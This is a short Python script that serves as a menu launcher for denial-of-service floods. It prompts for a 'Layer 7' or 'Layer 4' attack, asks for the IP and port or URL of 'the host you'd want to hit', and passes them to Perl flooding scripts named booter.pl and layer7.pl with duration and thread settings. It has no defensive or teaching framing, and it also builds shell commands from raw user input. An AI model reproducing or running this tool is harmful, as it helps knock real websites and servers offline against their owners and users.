#!/usr/bin/python3

import os

os.system("clear")
layer = input("1 >>> Layer 7\n2 >>> Layer 4 \n\nEnter >>> ")

def layer4():
    ip = input("Please enter the ip of the host you'd want to hit \nEXAMPLE: 127.0.0.1\n\nEnter >>>")
    os.system("clear")
    port = input("Please enter a port to hit \nNormally the port is just 80 \n\nEnter >>>")
    os.system("clear")
    os.system('perl booter.pl ' + ip + " " + port + " 300 10000")

def layer7():
    http = input("WARNING ONLY WORKS FOR http:// IP'S OR DOMAIN'S\n EXAMPLE: http://23.237.196.90\n\nEnter http website >>> ")
    os.system('perl layer7.pl ' + http + ' 500 500 POST')
if layer == "1":
    os.system("clear")
    layer7()

if layer == "2":
    os.system("clear")
    layer4()
